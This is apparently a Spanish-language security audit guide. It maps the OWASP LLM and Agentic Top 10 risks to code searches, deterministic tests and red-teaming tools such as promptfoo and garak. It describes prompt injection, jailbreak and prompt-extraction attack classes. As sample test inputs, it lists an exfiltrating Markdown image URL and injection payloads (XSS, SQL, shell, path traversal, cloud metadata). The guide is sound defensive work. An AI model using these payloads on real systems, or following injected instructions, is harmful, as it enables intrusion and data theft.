# LLM Top 10 2025 y Agentic Top 10 2026 para la auditoría

Referencia de las etapas 2, 4 y 7 en modo `+llm`. Cubre OWASP Top 10 for LLM Applications 2025 (LLM01–LLM10, vigente, sin versión 2026) y OWASP Top 10 for Agentic Applications for 2026 (ASI01–ASI10, publicado el 9 de diciembre de 2025). En `findings.json` usa `owasp.llm_2025` (`LLM01`) y `owasp.asi_2026` (`ASI01`), y el prefijo de ID `LLM-`.

## Contenido

- [Regla central](#regla-central)
- [Inventario: qué localizar primero](#inventario-qué-localizar-primero)
- [LLM01–LLM10 (2025)](#llm01llm10-2025)
- [ASI01–ASI10 (2026)](#asi01asi10-2026)
- [Tests deterministas frente a red teaming](#tests-deterministas-frente-a-red-teaming)
- [Herramientas de red teaming](#herramientas-de-red-teaming)

## Regla central

**El modelo nunca es la frontera de autorización.** Todo lo que el modelo puede provocar (llamar a una herramienta, recuperar un documento, escribir en memoria, renderizar una respuesta) se autoriza y valida **fuera** del modelo, con la identidad del usuario final, como si la petición viniera de él directamente.

Consecuencias que aplicas en cada revisión:
- Una instrucción en el system prompt ("no reveles X", "solo actúa sobre los datos del usuario") **no es un control**. Si es la única defensa, el hallazgo es de diseño (`DES-` o `LLM-` con `type: design`).
- La salida del modelo es **entrada no confiable**: tiene el mismo trato que un parámetro de query.
- Cualquier texto que entra en el contexto (páginas web, emails, documentos, chunks RAG, salidas de herramientas, descripciones de herramientas MCP) puede contener instrucciones. Dibuja la trust boundary app ↔ LLM ↔ herramienta en el DFD.
- Un test determinista sobre la capa de herramientas o de retrieval vale más que cualquier cantidad de red teaming: prueba el control, no el comportamiento del modelo.

## Inventario: qué localizar primero

Pasa siempre una ruta a `rg` (`.` o la carpeta del componente): sin ruta y sin terminal, `rg` lee stdin y se bloquea.

```bash
# SDKs y frameworks
rg -n -i 'from (openai|anthropic|langchain\w*|llama_index|semantic_kernel|transformers|litellm|ollama)|require\(["\x27](openai|@anthropic-ai/sdk|ai|langchain)|from ["\x27](openai|@anthropic-ai/sdk|ai|@langchain/\w+)["\x27]'
rg -n -i 'langchaingo|go-openai|anthropic-sdk-go|spring-ai|langchain4j'
# Ensamblado del prompt (busca concatenación de contenido no confiable)
rg -n -i '(system|messages|prompt)\s*[:=].*(\$\{|f["\x27]|\.format\(|\+\s*\w)'
rg -n -i 'role["\x27]?\s*:\s*["\x27](system|developer)'
# Definiciones de herramientas
rg -n -i 'tools\s*[:=]\s*\[|input_schema|"type"\s*:\s*"function"|@tool\b|StructuredTool|DynamicTool|tool\(\{|function_call|tool_choice'
# MCP
rg --files -uu | rg -i '(^|/)(\.mcp\.json|mcp\.json|claude_desktop_config\.json|mcp_config\.json)$'
rg -n -i 'mcpServers|@modelcontextprotocol|FastMCP|@mcp\.tool|server\.tool\(|McpServer'
# Retrieval y memoria
rg -n -i 'pinecone|weaviate|qdrant|chroma|pgvector|faiss|milvus|similarity_search|as_retriever|vector_store|embeddings?\.create'
rg -n -i 'memory|ConversationBuffer|chat_history|checkpointer|long.?term'
# Salida del modelo hacia sinks
rg -n -i '(completion|response|output|message)\.(content|text|choices).*(eval\(|exec\(|innerHTML|dangerouslySetInnerHTML|execute\(|subprocess|os\.system|open\(|fetch\(|requests\.)'
```

Para cada herramienta anota en `inventory.json`: qué hace, con qué credencial se ejecuta (la del usuario o una cuenta de servicio), qué parámetros acepta y cómo se validan, si requiere aprobación humana y quién puede invocarla.

## LLM01–LLM10 (2025)

### LLM01 Prompt Injection
Contenido del usuario o de una fuente indirecta cambia el comportamiento del modelo.
**En código**: contenido no confiable concatenado en el prompt sin separación de roles; contenido externo (web, email, RAG, tool output) que entra en el mismo contexto donde hay herramientas con efectos; ausencia de aprobación humana en acciones de alto impacto.
**Tests**: no hay test determinista que pruebe inmunidad. Prueba en su lugar que una inyección exitosa **no tiene efecto**: la herramienta peligrosa exige autorización y aprobación independientes del modelo. Red teaming: promptfoo `owasp:llm:01` con estrategias `jailbreak` y `jailbreak-templates`, `indirect-prompt-injection` para RAG; garak `promptinject`, `latentinjection`, `dan`, `encoding`.
**Mapeo**: sin categoría Top 10 directa; el impacto suele caer en A01 o A06 (CWE-501) · ASVS v5.0.0-8.3.1, v5.0.0-2.3.5, v5.0.0-15.2.5

### LLM02 Sensitive Information Disclosure
El modelo revela PII, secretos o datos de otros usuarios desde el contexto, el entrenamiento o las herramientas.
**En código**: datos de otros usuarios o tenants en el contexto; logs de prompts y respuestas con PII; respuestas sin redacción; contexto más amplio que lo que el usuario puede ver.
**Tests**: determinista sobre la función de redacción y sobre qué datos se cargan al contexto para un usuario dado. Red teaming: promptfoo `owasp:llm:02`, `pii:direct`, `pii:api-db`, `pii:session`, `pii:social`, `harmful:privacy`; garak `leakreplay`.
**Mapeo**: A01:2025 (CWE-200, CWE-359) · ASVS v5.0.0-14.1.1, v5.0.0-14.2.6, v5.0.0-16.2.5, v5.0.0-8.2.2

### LLM03 Supply Chain
Modelos, adaptadores, datasets, paquetes y plugins de terceros comprometidos o vulnerables.
**En código**: modelos descargados sin versión ni hash (`from_pretrained("org/model")` sin `revision`), `trust_remote_code=True`, archivos `.pkl`/`.pt` cargados con pickle, paquetes de IA sin fijar, servidores MCP lanzados con `npx -y paquete` o `@latest`.
**Tests**: SCA y SBOM con ML-BOM (CycloneDX); promptfoo ModelAudit para escaneo estático de archivos de modelo; garak `packagehallucination` para nombres de paquete inventados.
**Mapeo**: A03:2025, y A08:2025 si hay deserialización (CWE-502) · ASVS v5.0.0-15.1.2, v5.0.0-15.2.4, v5.0.0-1.5.2

### LLM04 Data and Model Poisoning
Datos de entrenamiento, fine-tuning o de la base de conocimiento manipulados para sesgar o abrir puertas traseras.
**En código**: pipelines de ingesta que aceptan documentos de usuarios sin procedencia ni revisión; fine-tuning con datos sin control; ausencia de versionado del dataset.
**Tests**: mayormente proceso y diseño. promptfoo admite que no puede prevenir el envenenamiento de entrenamiento, solo detectar efectos; `promptfoo redteam poison` (verificar flags) genera documentos envenenados para RAG.
**Mapeo**: A08:2025 (CWE-345, CWE-494) · ASVS v5.0.0-15.1.2, v5.0.0-2.2.1

### LLM05 Improper Output Handling
**Es injection clásica con el modelo como fuente.** La salida del modelo llega a un sink sin validar ni codificar: HTML, SQL, shell, `eval`, rutas de archivo, URLs que se piden. Se detecta en el código igual que A05.
**En código**: el último patrón del inventario; Markdown renderizado sin sanitizer (imágenes `![](https://atacante/?q=datos)` exfiltran); SQL generado por el modelo ejecutado con permisos de escritura; código generado ejecutado fuera de sandbox.
**Tests deterministas** (`plantillas-de-tests.md`): simula el modelo devolviendo `<img src=x onerror=alert(1)>`, `'; DROP TABLE`, `$(id)`, `../../etc/passwd`, `http://169.254.169.254/` y comprueba que el sink real lo neutraliza. garak `xss` y aserciones `not-contains` de promptfoo como complemento.
**Mapeo**: A05:2025 (CWE-79, CWE-89, CWE-78, CWE-94) o A01:2025 si es SSRF (CWE-918) · ASVS v5.0.0-1.2.1, v5.0.0-1.2.4, v5.0.0-1.2.5, v5.0.0-1.3.2, v5.0.0-3.2.2, v5.0.0-1.3.6

### LLM06 Excessive Agency
El agente tiene más funcionalidad, permisos o autonomía de los necesarios, y una salida manipulada provoca acciones dañinas.
**En código**: herramientas genéricas (`run_shell`, `execute_sql`, `http_request` sin allowlist) donde bastaría una específica; herramientas de escritura o borrado sin aprobación; credencial de servicio compartida en vez de la del usuario; scopes OAuth amplios; la herramienta no recibe la identidad del usuario y no puede autorizar.
**Tests deterministas**: invoca cada herramienta directamente como un usuario sin privilegios → la capa de herramientas deniega, sin pasar por el modelo; una herramienta marcada como "requiere aprobación" no se ejecuta sin el token de aprobación. Red teaming: promptfoo `owasp:llm:06`, `excessive-agency`, `rbac`, `bola`, `bfla`, `hijacking`, `imitation`.
**Mapeo**: A01:2025 (CWE-862, CWE-863) y A06:2025 (CWE-269) · ASVS v5.0.0-8.3.3, v5.0.0-8.2.1, v5.0.0-8.3.1, v5.0.0-13.2.2, v5.0.0-2.3.5, v5.0.0-10.4.11

### LLM07 System Prompt Leakage
El system prompt se filtra. El problema real es lo que contiene: secretos, reglas de autorización o datos internos.
**En código**: claves, tokens, URLs internas o lógica de permisos dentro del system prompt; system prompt usado como control de seguridad.
**Tests**: secret scanning y `rg` sobre las plantillas de prompt (determinista); promptfoo `prompt-extraction`, que requiere `config.systemPrompt`.
**Mapeo**: A02:2025 (CWE-260) o A07:2025 si son credenciales (CWE-798) · ASVS v5.0.0-13.3.1, v5.0.0-8.3.1

### LLM08 Vector and Embedding Weaknesses
Retrieval que devuelve datos de otro usuario o tenant, embeddings envenenados o fugas por el vector store. Es BOLA aplicado a chunks.
**En código**: consultas al vector store **sin filtro por tenant o permisos** (`similarity_search(query)` sin `filter=`); el filtro viene de un parámetro del cliente; un índice compartido por todos los tenants; documentos ingeridos sin la ACL de origen; namespaces por tenant que se eligen con un valor del body.
```bash
rg -n -i 'similarity_search\(|\.query\(\s*(vector|embedding)|as_retriever\(|\.search\(\s*(collection|index)'   # ¿hay filter / namespace / where del contexto autenticado?
```
**Tests deterministas**: indexa documentos de los tenants A y B; la recuperación como A nunca devuelve chunks de B, con cualquier consulta. Red teaming: promptfoo `rbac`, `bola`, `indirect-prompt-injection`.
**Mapeo**: A01:2025 (CWE-639, CWE-863) · ASVS v5.0.0-8.2.2, v5.0.0-8.4.1, v5.0.0-8.1.1

### LLM09 Misinformation
El modelo produce información falsa o inventada y la aplicación o el usuario confían en ella.
**En código**: respuestas usadas para decisiones automáticas sin verificación; ausencia de citas a la fuente en RAG; paquetes, URLs o APIs sugeridos por el modelo usados sin comprobar.
**Tests**: evaluaciones de factualidad específicas de la app; promptfoo `owasp:llm:09`, `hallucination`, `overreliance`. Es probabilístico y de producto.
**Mapeo**: sin categoría Top 10 ni requisito ASVS directo; trátalo como riesgo de diseño (A06:2025) y dilo así.

### LLM10 Unbounded Consumption
Consumo sin límite de tokens, peticiones o cómputo: denegación de servicio, coste descontrolado o extracción del modelo.
**En código**: llamadas sin `max_tokens`; sin cuota por usuario o tenant; bucles de agente sin máximo de iteraciones; reintentos sin tope; contexto que crece sin truncar; endpoints del LLM sin rate limit. Es API4 con factura del proveedor.
**Tests deterministas**: `max_tokens` presente en cada llamada; la cuota por usuario devuelve 429; el agente se detiene en N iteraciones. promptfoo `divergent-repetition` como complemento.
**Mapeo**: A06:2025 (CWE-799) · ASVS v5.0.0-2.4.1, v5.0.0-15.2.2, v5.0.0-15.1.3

## ASI01–ASI10 (2026)

> Los nombres de ASI01–ASI10 vienen de **fuentes secundarias** (Giskard, AIGL y otros); el PDF oficial no fue accesible durante la investigación. Las descripciones son una síntesis, no el texto de OWASP. Verifica contra el documento oficial antes de citarlo textualmente.

La lista agéntica complementa a la de LLM, no la reemplaza: un agente es casi siempre una aplicación LLM. Clasifica con ASI cuando el riesgo depende de la autonomía, las herramientas, la memoria o la delegación.

| ID | Nombre | Qué buscar en código y config | Test | Relación |
|---|---|---|---|---|
| ASI01 | Agent Goal Hijack | Contenido externo que redefine objetivos o planes; el plan del agente no se valida contra una política | Inyección indirecta en una fuente que el agente lee → la acción fuera de política se bloquea en la capa de herramientas | LLM01 |
| ASI02 | Tool Misuse and Exploitation | Herramientas sin allowlist de parámetros, encadenamientos peligrosos (leer secreto → enviar por HTTP), tools genéricas | Cada herramienta valida parámetros y destinos; combinaciones prohibidas se rechazan | LLM06, LLM05 |
| ASI03 | Identity and Privilege Abuse | Agente con credencial propia amplia o la del humano completa; tokens de larga vida; sin delegación acotada (on-behalf-of) | La herramienta autoriza con la identidad del usuario original (v5.0.0-8.3.3); un token del agente no sirve fuera de su scope | LLM06 |
| ASI04 | Agentic Supply Chain Vulnerabilities | Servidores MCP, herramientas, agent cards o registros de terceros sin fijar ni verificar; descripciones de tools no confiables (tool poisoning) | Config MCP con versión fijada y origen de confianza; revisión de las descripciones de tools que entran al contexto | LLM03, A03 |
| ASI05 | Unexpected Code Execution | Intérprete de código, `eval` de código generado, shell tool; sandbox sin aislar (red abierta, FS del host, sin límites) | El sandbox no tiene red ni acceso al host; límites de CPU, memoria y tiempo (v5.0.0-15.2.5) | LLM05, A05 |
| ASI06 | Memory & Context Poisoning | Memoria persistente escribible desde contenido no confiable; memoria compartida entre usuarios; sin procedencia ni caducidad | Contenido externo no puede escribir en memoria de largo plazo; la memoria de A no aparece en sesiones de B | LLM04, LLM08 |
| ASI07 | Insecure Inter-Agent Communication | Mensajes entre agentes sin autenticar ni firmar; un agente acepta órdenes de cualquier otro | Mensaje de un agente no registrado → rechazado (v5.0.0-13.2.1, v5.0.0-12.3.5) | — |
| ASI08 | Cascading Failures | Error o salida envenenada de un agente que se propaga sin límites; sin circuit breakers ni máximos de iteración | Fallo inyectado en un agente → los demás se detienen o degradan (v5.0.0-16.5.2) | LLM10, A10 |
| ASI09 | Human-Agent Trust Exploitation | El agente induce al humano a aprobar algo dañino; aprobaciones sin contexto suficiente | La pantalla de aprobación muestra la acción real y sus parámetros; acciones de alto valor exigen segunda aprobación (v5.0.0-2.3.5) | LLM09 |
| ASI10 | Rogue Agents | Agentes que actúan fuera de su mandato sin detección: sin registro de acciones, sin kill switch | Cada acción de herramienta se registra con agente, usuario y parámetros (v5.0.0-16.3.3); existe parada de emergencia | LLM06, A09 |

**Configuración MCP: qué revisar**
- Origen y versión: `npx -y paquete` sin versión, `@latest`, `uvx` sin fijar, imágenes Docker sin digest → ASI04/A03.
- Secretos en claro en `env` del archivo de configuración versionado → A02/A07.
- Alcance: raíces de filesystem amplias (`/`, `~`), tokens con scopes de escritura, servidores remotos por HTTP sin autenticación.
- Servidores propios (`@mcp.tool`, `server.tool(`): cada tool autoriza al usuario que la invoca y valida parámetros; sus descripciones no deben incluir instrucciones.

## Tests deterministas frente a red teaming

| Tipo | Qué prueba | Categorías | Resultado |
|---|---|---|---|
| Determinista (unit/integración) | El control fuera del modelo: sanitizer, autorización de la herramienta, filtro de retrieval, cuotas | LLM05, LLM06, LLM08, LLM10; ASI02, ASI03, ASI05, ASI06 | Pasa o falla; bloquea el CI |
| Red teaming probabilístico | El comportamiento del modelo bajo ataque | LLM01, LLM02, LLM07, LLM09; ASI01, ASI09 | "Los ataques muestreados fallaron", **nunca** "es seguro" |

En la etapa 7 escribe siempre los deterministas para LLM05, LLM06 y LLM08 (y LLM10 si hay agente o coste por token), con el modelo simulado para que el test no dependa de él. Plantillas de LLM05, LLM06 y LLM08 en `plantillas-de-tests.md`; LLM10 no tiene plantilla: sigue el patrón de rate limit.

Para gatear red teaming en CI: umbral de attack success rate por categoría (cero para fugas de secretos reales o system prompt con secretos), modelo y semilla fijados, `numTests` bajo en PR y completo en nightly, revisión manual de una muestra de los veredictos del juez LLM (son ruidosos). Ejecuta solo contra localhost o un staging que haya dado el usuario.

## Herramientas de red teaming

**promptfoo** (mapeo OWASP más explícito):
```yaml
redteam:
  plugins: [owasp:llm]              # o por categoría: owasp:llm:01, owasp:llm:02, owasp:llm:06 ...
  strategies: [jailbreak-templates, jailbreak]
```
- Presets por fase: `owasp:llm:redteam`, `owasp:llm:model`, `owasp:llm:implementation`, `owasp:llm:system`, `owasp:llm:runtime`.
- Plugins citados arriba: `pii:*`, `harmful:privacy`, `excessive-agency`, `rbac`, `bola`, `bfla`, `hijacking`, `imitation`, `overreliance`, `hallucination`, `prompt-extraction` (requiere `config.systemPrompt`), `indirect-prompt-injection` (requiere `indirectInjectionVar`), `divergent-repetition`.
- Hay páginas de promptfoo para OWASP API Top 10 y OWASP Agentic; el ID del preset agéntico no está confirmado (verificar flags).
- Ejecución: `npx promptfoo@<versión fijada> redteam run -c promptfooconfig.yaml -o results.json` (verificar flags). No uses `@latest` en CI: es exactamente el riesgo de A03.

**garak** (escáner de modelo, NVIDIA):
```bash
python -m garak --target_type openai --target_name <modelo> --probes promptinject,latentinjection,encoding   # (verificar flags)
python -m garak --list_probes
```
- Familias útiles: `promptinject`, `latentinjection`, `dan`, `encoding`, `leakreplay`, `xss`, `packagehallucination`.
- Guías de terceros citan etiquetas `owasp:llm01` y un flag `--probe_tags`; el README no lo documenta (verificar flags). Cobertura de etiqueta no equivale a cobertura de la categoría.

**PyRIT** (Microsoft): framework en Python con targets, orquestadores multi-turno, converters (codificaciones, traducciones) y scorers. Úsalo para campañas a medida contra agentes, no como preset OWASP. Su API cambia entre versiones (verificar flags).

Ninguna de las tres sustituye a los tests deterministas, y ninguna prueba que el modelo sea una frontera de autorización: no lo es.
